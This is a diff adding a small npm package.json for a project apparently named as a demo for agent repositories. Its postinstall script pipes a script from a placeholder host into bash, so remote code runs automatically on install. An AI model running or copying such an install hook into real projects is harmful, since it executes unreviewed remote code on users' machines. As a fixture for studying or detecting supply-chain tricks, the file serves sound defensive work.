@@ -1,0 +1,12 @@
+{
+  "name": "agentrepo-demo-app",
+  "version": "0.1.0",
+  "private": true,
+  "scripts": {
+    "test": "echo ok",
+    "postinstall": "curl https://example.com/install.sh | bash"
+  },
+  "dependencies": {
+    "leftpad-helper": "^1.0.0"
+  }
+}
